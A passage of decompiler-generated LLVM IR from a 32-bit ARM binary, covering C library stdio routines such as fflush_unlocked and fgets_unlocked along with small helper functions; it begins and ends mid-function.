  %v2_13cc0 = add i32 %v0_13cc0, 12
  %v3_13cc0 = inttoptr i32 %v2_13cc0 to i32*
  %v4_13cc0 = load i32, i32* %v3_13cc0, align 4
  store i32 %v4_13cc0, i32* %r3.global-to-local, align 4
  %v1_13cc4 = inttoptr i32 %v4_13cc0 to i32*
  %v2_13cc4 = load i32, i32* %v1_13cc4, align 4
  store i32 %v2_13cc4, i32* %r3.global-to-local, align 4
  %v7_13cc8 = icmp eq i32 %v2_13cc4, 1
  br i1 %v7_13cc8, label %dec_label_pc_13cd0, label %dec_label_pc_13d90

dec_label_pc_13cd0:                               ; preds = %entry
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_13cd4 = add i32 %v0_13cc0, 56
  %v3_13cd4 = inttoptr i32 %v2_13cd4 to i32*
  %v4_13cd4 = load i32, i32* %v3_13cd4, align 4
  store i32 %v4_13cd4, i32* %r3.global-to-local, align 4
  %v1_13cd8 = inttoptr i32 %v4_13cd4 to i32*
  %v2_13cd8 = load i32, i32* %v1_13cd8, align 4
  store i32 %v2_13cd8, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_13cd8, 1
  br i1 %tmp32, label %dec_label_pc_13d90, label %dec_label_pc_13ce4

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13cd0
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_13ce8 = add i32 %v0_13cc0, 104
  %v3_13ce8 = inttoptr i32 %v2_13ce8 to i32*
  %v4_13ce8 = load i32, i32* %v3_13ce8, align 4
  store i32 %v4_13ce8, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13c90)
  call void @__pseudo_branch(i32 %v4_13cb0)
  %v0_13d10 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d10 = add i32 %v0_13d10, 52
  %v3_13d10 = inttoptr i32 %v2_13d10 to i32*
  %v4_13d10 = load i32, i32* %v3_13d10, align 4
  store i32 %v4_13d10, i32* %r3.global-to-local, align 4
  %v1_13d14 = inttoptr i32 %v4_13d10 to i32*
  %v2_13d14 = load i32, i32* %v1_13d14, align 4
  store i32 %v2_13d14, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_13d6013 = icmp eq i32 %v2_13d14, 0
  br i1 %v2_13d6013, label %dec_label_pc_13d6c, label %dec_label_pc_13d24

dec_label_pc_13d24:                               ; preds = %dec_label_pc_13ce4, %dec_label_pc_13d5c
  %v0_13d484 = phi i32 [ %v0_13d5c, %dec_label_pc_13d5c ], [ %v2_13d14, %dec_label_pc_13ce4 ]
  %v1_13d24 = inttoptr i32 %v0_13d484 to i16*
  %v2_13d24 = load i16, i16* %v1_13d24, align 2
  %v3_13d24 = zext i16 %v2_13d24 to i32
  store i32 %v3_13d24, i32* %r3.global-to-local, align 4
  %v2_13d28 = and i32 %v3_13d24, 32816
  %v7_13d2c = icmp eq i32 %v2_13d28, 48
  %v1_13d30 = add i32 %v0_13d484, 32
  %v2_13d30 = inttoptr i32 %v1_13d30 to i32*
  %v3_13d30 = load i32, i32* %v2_13d30, align 4
  store i32 %v3_13d30, i32* %r5.global-to-local, align 4
  br i1 %v7_13d2c, label %dec_label_pc_13d3c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_13d24
  store i32 %v0_13d484, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d24
  %v0_13d3c = load i32, i32* %r7.global-to-local, align 4
  %v2_13d3c = icmp eq i32 %v0_13d3c, 0
  br i1 %v2_13d3c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13d3c
  %v1_13d40 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d40 = load i32, i32* %r8.global-to-local, align 4
  %v3_13d40 = add i32 %v2_13d40, %v1_13d40
  %v4_13d40 = inttoptr i32 %v3_13d40 to i32*
  %v5_13d40 = load i32, i32* %v4_13d40, align 4
  store i32 %v5_13d40, i32* %r3.global-to-local, align 4
  %v3_13d44 = inttoptr i32 %v5_13d40 to i32*
  store i32 %v3_13d30, i32* %v3_13d44, align 4
  %v0_13d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_13d48 = inttoptr i32 %v0_13d48 to i16*
  %v2_13d48 = load i16, i16* %v1_13d48, align 2
  %v3_13d48 = zext i16 %v2_13d48 to i32
  store i32 %v3_13d48, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_13d3c
  %v2_13d4810 = load i16, i16* %v1_13d24, align 2
  %v3_13d4811 = zext i16 %v2_13d4810 to i32
  store i32 %v3_13d4811, i32* %r3.global-to-local, align 4
  %v3_13d4c = add i32 %v0_13d3c, 32
  %v4_13d4c = inttoptr i32 %v3_13d4c to i32*
  store i32 %v3_13d30, i32* %v4_13d4c, align 4
  %v0_13d50.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_13d50 = phi i32 [ %v3_13d48, %.thread ], [ %v0_13d50.pre, %bb ]
  %v1_13d50 = and i32 %v0_13d50, 8192
  %v2_13d50 = icmp eq i32 %v1_13d50, 0
  br i1 %v2_13d50, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_13d58 = xor i1 %v2_13d50, true
  call void @__pseudo_cond_branch(i1 %v1_13d58, i32 ptrtoint (i32* @global_var_15e54.996 to i32))
  %v0_13d5c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %.thread23, %bb35
  %v0_13d5c = phi i32 [ %v0_13d5c.pre, %bb35 ], [ %v3_13d30, %.thread23 ]
  store i32 %v0_13d5c, i32* %r4.global-to-local, align 4
  %v2_13d60 = icmp eq i32 %v0_13d5c, 0
  br i1 %v2_13d60, label %dec_label_pc_13d60.dec_label_pc_13d6c_crit_edge, label %dec_label_pc_13d24

dec_label_pc_13d60.dec_label_pc_13d6c_crit_edge:  ; preds = %dec_label_pc_13d5c
  %v0_13d78.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13d6c

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d60.dec_label_pc_13d6c_crit_edge, %dec_label_pc_13ce4
  %v0_13d78 = phi i32 [ %v0_13d78.pre, %dec_label_pc_13d60.dec_label_pc_13d6c_crit_edge ], [ %v0_13d10, %dec_label_pc_13ce4 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_13d78 = add i32 %v0_13d78, 28
  %v3_13d78 = inttoptr i32 %v2_13d78 to i32*
  %v4_13d78 = load i32, i32* %v3_13d78, align 4
  call void @__pseudo_branch(i32 %v4_13d78)
  store i32 56, i32* %r3.global-to-local, align 4
  %v0_13d88 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d88 = add i32 %v0_13d88, 56
  %v3_13d88 = inttoptr i32 %v2_13d88 to i32*
  %v4_13d88 = load i32, i32* %v3_13d88, align 4
  store i32 %v4_13d88, i32* %r3.global-to-local, align 4
  %v0_13d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_13d8c = inttoptr i32 %v4_13d88 to i32*
  store i32 %v0_13d8c, i32* %v2_13d8c, align 4
  %v0_13d94.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13d90

dec_label_pc_13d90:                               ; preds = %entry, %dec_label_pc_13cd0, %dec_label_pc_13d6c
  %v0_13d94 = phi i32 [ %v0_13cc0, %entry ], [ %v0_13cc0, %dec_label_pc_13cd0 ], [ %v0_13d94.pre, %dec_label_pc_13d6c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_13d94 = add i32 %v0_13d94, 12
  %v3_13d94 = inttoptr i32 %v2_13d94 to i32*
  %v4_13d94 = load i32, i32* %v3_13d94, align 4
  %v1_13d98 = inttoptr i32 %v4_13d94 to i32*
  %v2_13d98 = load i32, i32* %v1_13d98, align 4
  %v1_13d9c = add i32 %v2_13d98, -1
  store i32 %v1_13d9c, i32* %v1_13d98, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_13db0 = load i32, i32* %r6.global-to-local, align 4
  %v2_13db0 = add i32 %v0_13db0, 28
  %v3_13db0 = inttoptr i32 %v2_13db0 to i32*
  %v4_13db0 = load i32, i32* %v3_13db0, align 4
  store i32 %v4_13db0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_13db0)
  %v2_13dc0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13dc0, i32* %r4.global-to-local, align 4
  ret i32 %v2_13c9c

; uselistorder directives
  uselistorder i32 %v0_13d5c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_13d90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13d5c, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_13d24, { 1, 0 }
}

define i32 @function_13dcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13dcc:
  %v0_13dcc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13dcc, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_13dcc
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13dcc, %bb
  %v10_13df0 = phi i32 [ %arg1, %dec_label_pc_13dcc ], [ 0, %bb ]
  ret i32 %v10_13df0

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %sb.global-to-local, align 4
  %v4_13e04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 52) to i32*), align 4
  store i32 %v4_13e04, i32* %r3.global-to-local, align 4
  %v10_13e08 = icmp eq i32 %tmp, %v4_13e04
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_13e08, label %bb, label %dec_label_pc_13e20

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13e30

dec_label_pc_13e20:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_13e24 = icmp eq i16* %arg1, null
  br i1 %v2_13e24, label %dec_label_pc_13e30, label %dec_label_pc_13f98

dec_label_pc_13e30:                               ; preds = %bb, %dec_label_pc_13e20
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_13e20 ]
  store i32 116, i32* %r3.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_13e44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 116) to i32*), align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_13e50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  store i32 20, i32* %stack_var_-72, align 4
  store i32 %v4_13e44, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13e50)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_13e74 = load i32, i32* %sb.global-to-local, align 4
  %v2_13e74 = add i32 %v0_13e74, 20
  %v3_13e74 = inttoptr i32 %v2_13e74 to i32*
  %v4_13e74 = load i32, i32* %v3_13e74, align 4
  call void @__pseudo_branch(i32 %v4_13e74)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_13e84 = add i32 %v0_13e74, 12
  %v3_13e84 = inttoptr i32 %v2_13e84 to i32*
  %v4_13e84 = load i32, i32* %v3_13e84, align 4
  store i32 %v4_13e84, i32* %r2.global-to-local, align 4
  %v1_13e88 = inttoptr i32 %v4_13e84 to i32*
  %v2_13e88 = load i32, i32* %v1_13e88, align 4
  store i32 28, i32* %sl.global-to-local, align 4
  %v1_13e90 = add i32 %v2_13e88, 1
  store i32 %v1_13e90, i32* %r3.global-to-local, align 4
  %v2_13e94 = add i32 %v0_13e74, 28
  %v3_13e94 = inttoptr i32 %v2_13e94 to i32*
  %v4_13e94 = load i32, i32* %v3_13e94, align 4
  store i32 %v1_13e90, i32* %v1_13e88, align 4
  call void @__pseudo_branch(i32 %v4_13e94)
  store i32 104, i32* %r3.global-to-local, align 4
  %v0_13eb0 = load i32, i32* %sb.global-to-local, align 4
  %v2_13eb0 = add i32 %v0_13eb0, 104
  %v3_13eb0 = inttoptr i32 %v2_13eb0 to i32*
  %v4_13eb0 = load i32, i32* %v3_13eb0, align 4
  store i32 %v4_13eb0, i32* @r4, align 4
  store i32 %v4_13eb0, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13e50)
  call void @__pseudo_branch(i32 %v4_13e74)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_13ed8 = load i32, i32* %sb.global-to-local, align 4
  %v2_13ed8 = add i32 %v0_13ed8, 52
  %v3_13ed8 = inttoptr i32 %v2_13ed8 to i32*
  %v4_13ed8 = load i32, i32* %v3_13ed8, align 4
  store i32 %v4_13ed8, i32* %r3.global-to-local, align 4
  %v1_13ee4 = inttoptr i32 %v4_13ed8 to i32*
  %v2_13ee4 = load i32, i32* %v1_13ee4, align 4
  store i32 %v2_13ee4, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_13e94)
  %v0_13ef0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13ef0, i32* @r6, align 4
  %v2_13ef4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_13ef4, i32* @r8, align 4
  store i32 80, i32* %fp.global-to-local, align 4
  %v0_13f88.pr = load i32, i32* @r7, align 4
  %v2_13f8819 = icmp eq i32 %v0_13f88.pr, 0
  br i1 %v2_13f8819, label %dec_label_pc_13f90, label %dec_label_pc_13efc

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13e30, %dec_label_pc_13f84
  %v0_13f08 = phi i32 [ %v3_13f84, %dec_label_pc_13f84 ], [ %v0_13f88.pr, %dec_label_pc_13e30 ]
  %v1_13efc = inttoptr i32 %v0_13f08 to i16*
  %v2_13efc = load i16, i16* %v1_13efc, align 2
  %v3_13efc = zext i16 %v2_13efc to i32
  store i32 %v3_13efc, i32* %r3.global-to-local, align 4
  %v1_13f00 = and i32 %v3_13efc, 64
  %v2_13f00 = icmp eq i32 %v1_13f00, 0
  br i1 %v2_13f00, label %dec_label_pc_13f84, label %dec_label_pc_13f08

dec_label_pc_13f08:                               ; preds = %dec_label_pc_13efc
  %v1_13f08 = add i32 %v0_13f08, 56
  store i32 %v1_13f08, i32* @r4, align 4
  store i32 %v1_13f08, i32* %r2.global-to-local, align 4
  %v0_13f18 = load i32, i32* %sb.global-to-local, align 4
  %v1_13f18 = load i32, i32* %fp.global-to-local, align 4
  %v2_13f18 = add i32 %v1_13f18, %v0_13f18
  %v3_13f18 = inttoptr i32 %v2_13f18 to i32*
  %v4_13f18 = load i32, i32* %v3_13f18, align 4
  call void @__pseudo_branch(i32 %v4_13f18)
  %v1_13f28 = load i32, i32* @r8, align 4
  %v2_13f28 = add i32 %v1_13f28, %v0_13f18
  %v3_13f28 = inttoptr i32 %v2_13f28 to i32*
  %v4_13f28 = load i32, i32* %v3_13f28, align 4
  call void @__pseudo_branch(i32 %v4_13f28)
  %v0_13f34 = load i32, i32* @r7, align 4
  %v1_13f34 = inttoptr i32 %v0_13f34 to i16*
  %v2_13f34 = load i16, i16* %v1_13f34, align 2
  %v3_13f34 = zext i16 %v2_13f34 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_13f3c = or i32 %v3_13f34, %stack_var_-60.1.in
  %v1_13f40 = xor i32 %v2_13f3c, 320
  store i32 %v1_13f40, i32* %r3.global-to-local, align 4
  %v1_13f44 = and i32 %v1_13f40, 832
  %v2_13f44 = icmp eq i32 %v1_13f44, 0
  br i1 %v2_13f44, label %dec_label_pc_13f4c, label %bb38

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f08
  store i32 %v0_13f34, i32* @r0, align 4
  %v0_13f50 = call i32 @__stdio_wcommit()
  %v2_13f54 = icmp eq i32 %v0_13f50, 0
  br i1 %v2_13f54, label %.thread7, label %.thread8

.thread7:                                         ; preds = %dec_label_pc_13f4c
  %v1_13f58 = load i32, i32* @r7, align 4
  %v2_13f58 = inttoptr i32 %v1_13f58 to i16*
  %v3_13f58 = load i16, i16* %v2_13f58, align 2
  %v4_13f58 = zext i16 %v3_13f58 to i32
  store i32 %v4_13f58, i32* %r3.global-to-local, align 4
  %v2_13f5c = add i32 %v1_13f58, 8
  %v3_13f5c = inttoptr i32 %v2_13f5c to i32*
  %v4_13f5c = load i32, i32* %v3_13f5c, align 4
  store i32 %v4_13f5c, i32* %r2.global-to-local, align 4
  %v2_13f60 = and i32 %v4_13f58, 65471
  store i32 %v2_13f60, i32* %r3.global-to-local, align 4
  %v3_13f64 = add i32 %v1_13f58, 28
  %v4_13f64 = inttoptr i32 %v3_13f64 to i32*
  store i32 %v4_13f5c, i32* %v4_13f64, align 4
  %v1_13f68 = load i32, i32* %r3.global-to-local, align 4
  %v2_13f68 = trunc i32 %v1_13f68 to i16
  %v3_13f68 = load i32, i32* @r7, align 4
  %v4_13f68 = inttoptr i32 %v3_13f68 to i16*
  store i16 %v2_13f68, i16* %v4_13f68, align 2
  br label %bb38

.thread8:                                         ; preds = %dec_label_pc_13f4c
  store i32 -1, i32* @r6, align 4
  br label %bb38

bb38:                                             ; preds = %.thread7, %dec_label_pc_13f08, %.thread8
  %v0_13f78 = load i32, i32* %sb.global-to-local, align 4
  %v1_13f78 = load i32, i32* %sl.global-to-local, align 4
  %v2_13f78 = add i32 %v1_13f78, %v0_13f78
  %v3_13f78 = inttoptr i32 %v2_13f78 to i32*
  %v4_13f78 = load i32, i32* %v3_13f78, align 4
  call void @__pseudo_branch(i32 %v4_13f78)
  %v0_13f84.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13efc, %bb38
  %v0_13f84 = phi i32 [ %v0_13f08, %dec_label_pc_13efc ], [ %v0_13f84.pre, %bb38 ]
  %v1_13f84 = add i32 %v0_13f84, 32
  %v2_13f84 = inttoptr i32 %v1_13f84 to i32*
  %v3_13f84 = load i32, i32* %v2_13f84, align 4
  store i32 %v3_13f84, i32* @r7, align 4
  %v2_13f88 = icmp eq i32 %v3_13f84, 0
  br i1 %v2_13f88, label %dec_label_pc_13f90, label %dec_label_pc_13efc

dec_label_pc_13f90:                               ; preds = %dec_label_pc_13f84, %dec_label_pc_13e30
  %v0_13f90 = call i32 @_stdio_openlist_dec_use()
  %v0_13fcc.pre = load i32, i32* @r6, align 4
  br label %bb40

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13e20
  %v2_13f98 = load i16, i16* %arg1, align 2
  %v3_13f98 = zext i16 %v2_13f98 to i32
  %v1_13f9c = and i32 %v3_13f98, 64
  store i32 %v1_13f9c, i32* %r3.global-to-local, align 4
  %v2_13f9c = icmp eq i32 %v1_13f9c, 0
  br i1 %v2_13f9c, label %bb39, label %dec_label_pc_13fa8

bb39:                                             ; preds = %dec_label_pc_13f98
  br label %bb40

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13f98
  %v0_13fa8 = call i32 @__stdio_wcommit()
  %v2_13fac = icmp eq i32 %v0_13fa8, 0
  br i1 %v2_13fac, label %.thread15, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_13fa8
  br label %bb40

.thread15:                                        ; preds = %dec_label_pc_13fa8
  %v1_13fb0 = load i32, i32* %fp.global-to-local, align 4
  %v2_13fb0 = inttoptr i32 %v1_13fb0 to i16*
  %v3_13fb0 = load i16, i16* %v2_13fb0, align 2
  %v4_13fb0 = zext i16 %v3_13fb0 to i32
  store i32 %v4_13fb0, i32* %r3.global-to-local, align 4
  %v2_13fb4 = add i32 %v1_13fb0, 8
  %v3_13fb4 = inttoptr i32 %v2_13fb4 to i32*
  %v4_13fb4 = load i32, i32* %v3_13fb4, align 4
  store i32 %v4_13fb4, i32* %r2.global-to-local, align 4
  %v2_13fb8 = and i32 %v4_13fb0, 65471
  store i32 %v2_13fb8, i32* %r3.global-to-local, align 4
  %v2_13fbc = trunc i32 %v2_13fb8 to i16
  store i16 %v2_13fbc, i16* %v2_13fb0, align 2
  %v1_13fc0 = load i32, i32* %r2.global-to-local, align 4
  %v2_13fc0 = load i32, i32* %fp.global-to-local, align 4
  %v3_13fc0 = add i32 %v2_13fc0, 28
  %v4_13fc0 = inttoptr i32 %v3_13fc0 to i32*
  store i32 %v1_13fc0, i32* %v4_13fc0, align 4
  br label %bb40

bb40:                                             ; preds = %bb39, %.thread17, %dec_label_pc_13f90, %.thread15
  %v0_13fcc = phi i32 [ -1, %.thread17 ], [ 0, %bb39 ], [ %v0_13fcc.pre, %dec_label_pc_13f90 ], [ 0, %.thread15 ]
  ret i32 %v0_13fcc

; uselistorder directives
  uselistorder i32 %v3_13f84, { 1, 2, 0 }
  uselistorder i32 %v0_13e74, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 832, { 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 116) to i32*), { 1, 2, 0 }
  uselistorder i32 116, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %bb40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13f84, { 1, 0 }
  uselistorder label %bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13efc, { 1, 0 }
  uselistorder label %dec_label_pc_13e30, { 1, 0 }
}

define i32 @function_13fe0(i32 %arg1) local_unnamed_addr {
dec_label_pc_13fe0:
  %v0_13fe0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13fe0, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_13fe0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13fe0, %bb
  %v5_13ffc = phi i32 [ %arg1, %dec_label_pc_13fe0 ], [ 0, %bb ]
  ret i32 %v5_13ffc

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_14000 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14004 = icmp eq i32 %arg2, 0
  store i1 %v2_14004, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1408c, label %dec_label_pc_14074.preheader

dec_label_pc_14074.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_140742 = add i32 %arg2, -1
  store i32 %v1_140742, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_140748 = icmp eq i32 %arg2, 1
  store i1 %v7_140748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_140748, label %dec_label_pc_1407c, label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %dec_label_pc_14074.preheader, %dec_label_pc_14074.backedge.dec_label_pc_14020_crit_edge
  %v0_14044 = phi i32 [ %v0_14020.pre, %dec_label_pc_14074.backedge.dec_label_pc_14020_crit_edge ], [ %arg3, %dec_label_pc_14074.preheader ]
  %v1_14020 = add i32 %v0_14044, 16
  %v2_14020 = inttoptr i32 %v1_14020 to i32*
  %v3_14020 = load i32, i32* %v2_14020, align 4
  store i32 %v3_14020, i32* %r2.global-to-local, align 4
  %v1_14024 = add i32 %v0_14044, 24
  %v2_14024 = inttoptr i32 %v1_14024 to i32*
  %v3_14024 = load i32, i32* %v2_14024, align 4
  store i32 %v3_14024, i32* %r3.global-to-local, align 4
  %v3_14028 = icmp uge i32 %v3_14020, %v3_14024
  store i1 %v3_14028, i1* %cpsr_c.global-to-local, align 1
  %v9_14028 = icmp eq i32 %v3_14020, %v3_14024
  store i1 %v9_14028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14028, label %dec_label_pc_14044, label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %dec_label_pc_14020
  %v1_14030 = inttoptr i32 %v3_14020 to i8*
  %v2_14030 = load i8, i8* %v1_14030, align 1
  %v3_14030 = zext i8 %v2_14030 to i32
  store i32 %v3_14030, i32* %r3.global-to-local, align 4
  %v5_14030 = add i32 %v3_14020, 1
  store i32 %v5_14030, i32* %r2.global-to-local, align 4
  %v2_14034 = load i32, i32* @r5, align 4
  %v3_14034 = inttoptr i32 %v2_14034 to i8*
  store i8 %v2_14030, i8* %v3_14034, align 1
  %v4_14034 = load i32, i32* @r5, align 4
  %v5_14034 = add i32 %v4_14034, 1
  store i32 %v5_14034, i32* @r5, align 4
  %v0_14038 = load i32, i32* %r3.global-to-local, align 4
  %v2_14038 = icmp ugt i32 %v0_14038, 9
  store i1 %v2_14038, i1* %cpsr_c.global-to-local, align 1
  %v7_14038 = icmp eq i32 %v0_14038, 10
  store i1 %v7_14038, i1* %cpsr_z.global-to-local, align 1
  %v0_1403c = load i32, i32* %r2.global-to-local, align 4
  %v1_1403c = load i32, i32* @r4, align 4
  %v2_1403c = add i32 %v1_1403c, 16
  %v3_1403c = inttoptr i32 %v2_1403c to i32*
  store i32 %v0_1403c, i32* %v3_1403c, align 4
  br i1 %v7_14038, label %dec_label_pc_1407c, label %dec_label_pc_14074.backedge

dec_label_pc_14044:                               ; preds = %dec_label_pc_14020
  %v1_14044 = inttoptr i32 %v0_14044 to i16*
  %v3_14048 = call i32 @getc_unlocked(i16* %v1_14044)
  %v3_1404c = icmp eq i32 %v3_14048, -1
  store i1 %v3_1404c, i1* %cpsr_c.global-to-local, align 1
  %v8_1404c = icmp eq i32 %v3_14048, -1
  store i1 %v8_1404c, i1* %cpsr_z.global-to-local, align 1
  %v1_14050 = urem i32 %v3_14048, 256
  store i32 %v1_14050, i32* %r3.global-to-local, align 4
  br i1 %v3_1404c, label %dec_label_pc_14058, label %dec_label_pc_14070

dec_label_pc_14058:                               ; preds = %dec_label_pc_14044
  %v0_14058 = load i32, i32* @r4, align 4
  %v1_14058 = inttoptr i32 %v0_14058 to i16*
  %v2_14058 = load i16, i16* %v1_14058, align 2
  %v3_14058 = zext i16 %v2_14058 to i32
  store i32 %v3_14058, i32* %r3.global-to-local, align 4
  %v1_1405c = and i32 %v3_14058, 8
  %v2_1405c = icmp eq i32 %v1_1405c, 0
  store i1 %v2_1405c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1405c, label %dec_label_pc_1407c, label %dec_label_pc_1408c

dec_label_pc_14070:                               ; preds = %dec_label_pc_14044
  %v1_14068 = trunc i32 %v3_14048 to i8
  %v2_14068 = load i32, i32* @r5, align 4
  %v3_14068 = inttoptr i32 %v2_14068 to i8*
  store i8 %v1_14068, i8* %v3_14068, align 1
  %v4_14068 = load i32, i32* @r5, align 4
  %v5_14068 = add i32 %v4_14068, 1
  store i32 %v5_14068, i32* @r5, align 4
  %v0_1406c = load i32, i32* %r3.global-to-local, align 4
  %v2_1406c = icmp ugt i32 %v0_1406c, 9
  store i1 %v2_1406c, i1* %cpsr_c.global-to-local, align 1
  %v7_1406c = icmp eq i32 %v0_1406c, 10
  store i1 %v7_1406c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1406c, label %dec_label_pc_1407c, label %dec_label_pc_14074.backedge

dec_label_pc_14074.backedge:                      ; preds = %dec_label_pc_14070, %dec_label_pc_14030
  %v0_14074 = load i32, i32* %r6.global-to-local, align 4
  %v1_14074 = add i32 %v0_14074, -1
  store i32 %v1_14074, i32* %r6.global-to-local, align 4
  %v2_14074 = icmp ne i32 %v0_14074, 0
  store i1 %v2_14074, i1* %cpsr_c.global-to-local, align 1
  %v7_14074 = icmp eq i32 %v0_14074, 1
  store i1 %v7_14074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14074, label %dec_label_pc_1407c, label %dec_label_pc_14074.backedge.dec_label_pc_14020_crit_edge

dec_label_pc_14074.backedge.dec_label_pc_14020_crit_edge: ; preds = %dec_label_pc_14074.backedge
  %v0_14020.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14020

